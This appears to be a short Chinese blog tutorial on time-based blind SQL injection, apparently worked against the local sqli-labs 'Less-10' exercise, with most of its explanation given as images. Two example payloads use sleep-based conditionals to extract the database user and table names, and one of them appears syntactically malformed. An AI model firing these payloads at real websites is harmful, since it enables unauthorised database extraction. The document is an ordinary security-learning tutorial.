---
layout: post
title: "1.3.2-SQL注入-SQL盲注-时间盲注"
date: 2018-06-23
category: web安全
tags: sql注入 sql盲注
---

## 时间盲注

### 时间盲注原理
![](https://coding.net/u/tea9/p/image/git/raw/master/blog_img/06/01.png)
![](https://coding.net/u/tea9/p/image/git/raw/master/blog_img/06/02.png)



### 时间盲注方法

![](https://coding.net/u/tea9/p/image/git/raw/master/blog_img/06/03.png)
	
	http://localhost:90/Less-10/?id=1" and if(left(user(),1)='a',0,sleep(3))--+

	http://localhost:90/Less-10/?id=1" and if(left(select table_name from information_schema.tables where table_schema=database() limit 0,1),1)='r',0,sleep(3))--+

时间注入脚本  

![](https://coding.net/u/tea9/p/image/git/raw/master/blog_img/06/04.png)
![](https://coding.net/u/tea9/p/image/git/raw/master/blog_img/06/05.png)
